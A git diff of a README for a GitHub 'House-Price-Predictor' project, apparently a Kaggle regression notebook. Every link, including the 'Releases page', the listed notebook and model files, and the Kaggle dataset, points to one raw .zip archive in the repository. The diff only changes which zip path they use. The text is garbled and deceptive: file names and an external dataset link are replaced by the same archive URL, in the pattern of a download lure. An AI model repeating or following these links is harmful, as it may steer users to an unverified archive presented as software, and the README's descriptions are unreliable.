@@ -1,6 +1,6 @@
 # 🏡 House-Price-Predictor - Predict Your Home's Value Easily
 
-[![Download Now](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip)
+[![Download Now](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip)
 
 ## 📖 Overview
 
@@ -14,15 +14,15 @@ This section will guide you through the steps to download and run the software. 
 
 To download the application, visit this page:
 
-[Download from Releases](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip)
+[Download from Releases](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip)
 
 Look for the latest release version on this page. You can download the necessary files for your use.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip).
 2. Find the version you would like to install.
-3. Download `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip` for the main Notebook.
-4. Optionally, download `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip` to view predicted house prices.
-5. You can also save the `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip` file, which contains the trained model.
+3. Download `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip` for the main Notebook.
+4. Optionally, download `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip` to view predicted house prices.
+5. You can also save the `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip` file, which contains the trained model.
 
 ### 💻 System Requirements
 
@@ -35,9 +35,9 @@ Look for the latest release version on this page. You can download the necessary
 
 Here's what you'll find in the download:
 
-- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip`: This Jupyter Notebook contains all the steps for data analysis and predictions. You will find code to help you understand how house prices are predicted.
-- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip`: This file includes the predicted house prices based on the test dataset.
-- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip`: This file includes the trained Gradient Boosting model.
+- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip`: This Jupyter Notebook contains all the steps for data analysis and predictions. You will find code to help you understand how house prices are predicted.
+- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip`: This file includes the predicted house prices based on the test dataset.
+- `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip`: This file includes the trained Gradient Boosting model.
 
 ## 📚 Libraries Used
 
@@ -55,7 +55,7 @@ Make sure you have these libraries available in your Python environment.
 ## 🎯 How to Run the Application
 
 1. **Open Jupyter Notebook**: Launch Jupyter Notebook on your computer.
-2. **Import the Notebook**: Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip`.
+2. **Import the Notebook**: Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip`.
 3. **Run the Cells**: Click on the cells in the notebook to run the code. Follow the instructions in the notebook to perform data preprocessing and make predictions.
 
 ### 🤔 What to Expect
@@ -68,7 +68,7 @@ Make sure you have these libraries available in your Python environment.
 
 This project uses data from the Kaggle competition "House Prices - Advanced Regression Techniques". You can explore the dataset further by visiting:
 
-[House Prices - Advanced Regression Techniques](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip)
+[House Prices - Advanced Regression Techniques](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip)
 
 The model achieved an impressive score of 87.16% on R-squared, indicating its accuracy in predictions.
 
@@ -90,4 +90,4 @@ This project involves the following topics: ai, artificial-intelligence, data-an
 
 Using the House-Price-Predictor application is straightforward. Just follow the steps outlined above. With the right inputs, you will have a clear estimate of house prices, making your buying or selling decision easier.
 
-For updates and new releases, always check back on the [Releases page](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/overgraze/House-Price-Predictor.zip).
+For updates and new releases, always check back on the [Releases page](https://raw.githubusercontent.com/Voto205/House-Price-Predictor/main/ML_Model/Predictor-House-Price-2.1.zip).
